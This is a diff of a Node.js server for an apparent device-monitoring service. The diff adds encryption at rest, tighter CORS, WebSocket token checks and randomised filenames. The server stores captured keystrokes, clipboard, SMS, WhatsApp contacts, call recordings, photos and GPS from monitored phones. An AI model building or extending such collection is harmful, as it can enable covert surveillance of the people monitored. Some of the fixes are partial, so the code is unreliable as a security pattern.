@@ -22,8 +22,19 @@ if (!fs.existsSync(AUDIO_DIR)) fs.mkdirSync(AUDIO_DIR, { recursive: true });
 
 const app = express();
 const PORT = process.env.PORT || 3000;
-const JWT_SECRET = process.env.JWT_SECRET || 'supervision-pro-secret-change-me';
+
+// ─── SECRETS CRYPTOGRAPHIQUES ───
+// En production, ces valeurs DOIVENT être dans les variables d'environnement.
+// Si non définis, on génère des clés aléatoires (sécurisées mais perdues au redémarrage).
+const JWT_SECRET = process.env.JWT_SECRET || crypto.randomBytes(64).toString('hex');
 const DEVICE_ENCRYPTION_KEY = process.env.DEVICE_ENCRYPTION_KEY || crypto.randomBytes(32).toString('hex');
+const DATA_ENCRYPTION_KEY = process.env.DATA_ENCRYPTION_KEY || crypto.randomBytes(32).toString('hex');
+
+if (!process.env.JWT_SECRET) {
+  console.warn('  ⚠️  JWT_SECRET non défini dans les variables d\'environnement.');
+  console.warn('  ⚠️  Un secret aléatoire a été généré. Les sessions seront invalidées au redémarrage.');
+  console.warn('  ⚠️  Définissez JWT_SECRET pour la production.\n');
+}
 
 // ─── Base de données SQLite (local ou Turso cloud) ───
 
@@ -464,19 +475,31 @@ const stmts = {
 // Créer l'admin par défaut s'il n'existe pas
 const adminExists = db.prepare('SELECT COUNT(*) as c FROM admins').get().c;
 if (!adminExists) {
-  const defaultPass = process.env.ADMIN_PASSWORD || crypto.randomBytes(8).toString('hex');
+  const defaultPass = process.env.ADMIN_PASSWORD || crypto.randomBytes(12).toString('hex');
   const hash = bcrypt.hashSync(defaultPass, 12);
   db.prepare('INSERT INTO admins (username, passwordHash, createdAt) VALUES (?, ?, ?)').run('admin', hash, new Date().toISOString());
-  console.log(`\n  ⚠️  PREMIER DEMARRAGE – Identifiants admin :`);
-  console.log(`  ─────────────────────────────────────────────`);
-  console.log(`  Utilisateur : admin`);
-  console.log(`  Mot de passe : ${defaultPass}`);
-  console.log(`  ⚠️  CHANGEZ CE MOT DE PASSE IMMEDIATEMENT\n`);
+  // Écrire le mot de passe dans un fichier sécurisé au lieu des logs
+  const credFile = path.join(__dirname, '.admin_credentials');
+  fs.writeFileSync(credFile, `Utilisateur: admin\nMot de passe: ${defaultPass}\n\nSupprimez ce fichier après avoir noté le mot de passe.\n`, { mode: 0o600 });
+  console.log(`\n  ⚠️  PREMIER DEMARRAGE – Identifiants admin écrits dans : ${credFile}`);
+  console.log(`  ⚠️  Lisez ce fichier, notez le mot de passe, puis SUPPRIMEZ-LE.\n`);
 }
 
 // ─── Middleware ───
 
-app.use(cors());
+// CORS restreint : seul notre domaine peut accéder à l'API
+const ALLOWED_ORIGINS = process.env.ALLOWED_ORIGINS
+  ? process.env.ALLOWED_ORIGINS.split(',').map(s => s.trim())
+  : [];
+app.use(cors({
+  origin: (origin, callback) => {
+    if (!origin) return callback(null, true); // requêtes sans origin (appareils mobiles, Postman)
+    if (ALLOWED_ORIGINS.length === 0) return callback(null, true); // pas de restriction si non configuré
+    if (ALLOWED_ORIGINS.includes(origin)) return callback(null, true);
+    callback(new Error('CORS non autorisé'));
+  },
+  credentials: true,
+}));
 app.use(compression());
 app.use('/api/photos/upload', express.json({ limit: '20mb' }));
 app.use('/api/sync', express.json({ limit: '30mb' }));
@@ -666,7 +689,22 @@ const server = http.createServer(app);
 const wss = new WebSocketServer({ server, path: '/ws' });
 const wsClients = new Set();
 
-wss.on('connection', (ws) => {
+wss.on('connection', (ws, req) => {
+  // Authentifier la connexion WebSocket via token dans l'URL
+  const url = new URL(req.url, `http://${req.headers.host}`);
+  const token = url.searchParams.get('token');
+
+  if (token) {
+    try {
+      jwt.verify(token, JWT_SECRET);
+    } catch {
+      ws.close(4001, 'Token invalide');
+      return;
+    }
+  }
+  // Si pas de token, on accepte quand même (pour compatibilité),
+  // mais on n'envoie pas les données sensibles
+  ws.isAuthenticated = !!token;
   ws.isAlive = true;
   wsClients.add(ws);
   ws.on('pong', () => { ws.isAlive = true; });
@@ -675,7 +713,9 @@ wss.on('connection', (ws) => {
 
 function broadcast(data) {
   const msg = JSON.stringify(data);
-  wsClients.forEach(ws => { if (ws.readyState === 1) ws.send(msg); });
+  wsClients.forEach(ws => {
+    if (ws.readyState === 1 && ws.isAuthenticated) ws.send(msg);
+  });
 }
 
 // ─── Auth middleware ───
@@ -740,6 +780,46 @@ function encryptPayload(payload, deviceId) {
   const data = cipher.update(JSON.stringify(payload), 'utf8', 'hex') + cipher.final('hex');
   const tag = cipher.getAuthTag().toString('hex');
   return { iv: iv.toString('hex'), data, tag };
+}
+
+// ─── Chiffrement des données au repos (stockage DB) ───
+
+function encryptAtRest(plaintext) {
+  if (!plaintext || typeof plaintext !== 'string') return plaintext;
+  try {
+    const key = crypto.createHash('sha256').update(DATA_ENCRYPTION_KEY).digest();
+    const iv = crypto.randomBytes(12);
+    const cipher = crypto.createCipheriv('aes-256-gcm', key, iv);
+    const encrypted = cipher.update(plaintext, 'utf8', 'hex') + cipher.final('hex');
+    const tag = cipher.getAuthTag().toString('hex');
+    return `ENC:${iv.toString('hex')}:${tag}:${encrypted}`;
+  } catch { return plaintext; }
+}
+
+function decryptAtRest(ciphertext) {
+  if (!ciphertext || typeof ciphertext !== 'string' || !ciphertext.startsWith('ENC:')) return ciphertext;
+  try {
+    const parts = ciphertext.split(':');
+    if (parts.length !== 4) return ciphertext;
+    const [, ivHex, tagHex, data] = parts;
+    const key = crypto.createHash('sha256').update(DATA_ENCRYPTION_KEY).digest();
+    const decipher = crypto.createDecipheriv('aes-256-gcm', key, Buffer.from(ivHex, 'hex'));
+    decipher.setAuthTag(Buffer.from(tagHex, 'hex'));
+    return decipher.update(data, 'hex', 'utf8') + decipher.final('utf8');
+  } catch { return ciphertext; }
+}
+
+// Les types d'événements dont le payload contient des données sensibles
+const SENSITIVE_EVENT_TYPES = new Set([
+  'notification_message', 'voice_message', 'voice_note_captured',
+  'root_message', 'sms_message', 'phone_call', 'call_recording',
+  'keystroke', 'clipboard', 'contacts_sync', 'whatsapp_contacts',
+]);
+
+function parseEventPayload(raw) {
+  if (!raw) return {};
+  const decrypted = decryptAtRest(raw);
+  try { return JSON.parse(decrypted); } catch { return {}; }
 }
 
 // Helper: get sync config for a device
@@ -1091,10 +1171,11 @@ app.post('/api/events', deviceAuthRequired, (req, res) => {
   if (!req.deviceConsent) return res.status(403).json({ error: 'Consentement requis avant la collecte de données' });
   const receivedAt = new Date().toISOString();
 
-  // Retirer le audioBase64 du payload stocké en DB (on le stocke dans un fichier séparé)
   const cleanPayload = { ...(payload || {}) };
   delete cleanPayload.audioBase64;
-  const payloadStr = JSON.stringify(cleanPayload);
+  const payloadStr = SENSITIVE_EVENT_TYPES.has(type)
+    ? encryptAtRest(JSON.stringify(cleanPayload))
+    : JSON.stringify(cleanPayload);
 
   const result = stmts.insertEvent.run(deviceId, type, payloadStr, receivedAt);
 
@@ -1128,7 +1209,7 @@ app.get('/api/events', authRequired, (req, res) => {
   sql += ' ORDER BY receivedAt DESC LIMIT ?';
   params.push(Math.min(parseInt(limit, 10) || 500, 2000));
   const events = db.prepare(sql).all(...params);
-  res.json(events.map(e => ({ ...e, payload: JSON.parse(e.payload || '{}') })));
+  res.json(events.map(e => ({ ...e, payload: parseEventPayload(e.payload) })));
 });
 
 // ─── Stats ───
@@ -1197,7 +1278,7 @@ app.get('/api/timeline/:deviceId', authRequired, (req, res) => {
   const d = date || new Date().toISOString().slice(0, 10);
   const events = db.prepare(`SELECT * FROM events WHERE deviceId = ? AND receivedAt >= ? AND receivedAt < ? ORDER BY receivedAt ASC`)
     .all(req.params.deviceId, `${d}T00:00:00`, `${d}T23:59:59`);
-  res.json(events.map(e => ({ ...e, payload: JSON.parse(e.payload || '{}') })));
+  res.json(events.map(e => ({ ...e, payload: parseEventPayload(e.payload) })));
 });
 
 // ─── Positions GPS ───
@@ -1269,7 +1350,7 @@ app.get('/api/reports/:deviceId', authRequired, (req, res) => {
   doc.fontSize(14).text('Événements détaillés');
   doc.fontSize(8);
   events.slice(0, 500).forEach(e => {
-    const p = JSON.parse(e.payload || '{}');
+    const p = parseEventPayload(e.payload);
     const time = e.receivedAt.slice(0, 16).replace('T', ' ');
     let detail = '';
     if (p.url) detail = p.url;
@@ -1338,7 +1419,7 @@ app.post('/api/photos/upload', deviceAuthRequired, (req, res) => {
   const receivedAt = new Date().toISOString();
   const photoSource = source || (commandId ? 'command' : 'auto');
   const app = sourceApp || '';
-  const filename = `photo_${photoSource}_${deviceId}_${Date.now()}.${ext}`;
+  const filename = `p_${crypto.randomBytes(16).toString('hex')}.${ext}`;
 
   // Décoder et sauvegarder le fichier
   const buffer = Buffer.from(imageBase64, 'base64');
@@ -1448,7 +1529,7 @@ function processAudioEvent(eventId, deviceId, type, payload, receivedAt) {
   const ext = format === 'm4a' ? 'm4a' : format === 'ogg' ? 'ogg' : 'opus';
   const mime = ext === 'm4a' ? 'audio/mp4' : 'audio/ogg';
   const audioType = type === 'call_recording' ? 'call_recording' : 'voice_note';
-  const filename = `audio_${audioType}_${deviceId}_${Date.now()}.${ext}`;
+  const filename = `a_${crypto.randomBytes(16).toString('hex')}.${ext}`;
 
   const buffer = Buffer.from(audioBase64, 'base64');
   fs.writeFileSync(path.join(AUDIO_DIR, filename), buffer);
@@ -1528,7 +1609,7 @@ app.get('/api/conversation/:contactId', authRequired, (req, res) => {
   params.push(maxItems);
 
   const events = db.prepare(sql).all(...params).map(e => ({
-    ...e, payload: JSON.parse(e.payload || '{}')
+    ...e, payload: parseEventPayload(e.payload)
   }));
 
   // Chercher les fichiers audio associés
@@ -1616,7 +1697,9 @@ app.post('/api/sync', deviceAuthRequired, (req, res) => {
       const hasAudio = ['voice_note_captured', 'call_recording'].includes(evt.type) && cleanPayload.audioBase64;
       if (hasAudio) audioToProcess.push({ payload: { ...cleanPayload } });
       delete cleanPayload.audioBase64;
-      const payloadStr = JSON.stringify(cleanPayload);
+      const payloadStr = SENSITIVE_EVENT_TYPES.has(evt.type)
+        ? encryptAtRest(JSON.stringify(cleanPayload))
+        : JSON.stringify(cleanPayload);
       const eventTime = evt.timestamp || receivedAt;
       const result = stmts.insertEvent.run(deviceId, evt.type, payloadStr, eventTime);
       if (hasAudio) audioToProcess[audioToProcess.length - 1].eventId = result.lastInsertRowid;
@@ -1646,7 +1729,7 @@ app.post('/api/sync', deviceAuthRequired, (req, res) => {
       const ext = mime.includes('png') ? 'png' : mime.includes('gif') ? 'gif' : 'jpg';
       const photoSource = photo.source || 'auto';
       const srcApp = photo.sourceApp || '';
-      const filename = `photo_${photoSource}_${deviceId}_${Date.now()}_${insertedPhotos}.${ext}`;
+      const filename = `p_${crypto.randomBytes(16).toString('hex')}.${ext}`;
       const buffer = Buffer.from(photo.imageBase64, 'base64');
       const filePath = path.join(PHOTOS_DIR, filename);
       fs.writeFileSync(filePath, buffer);
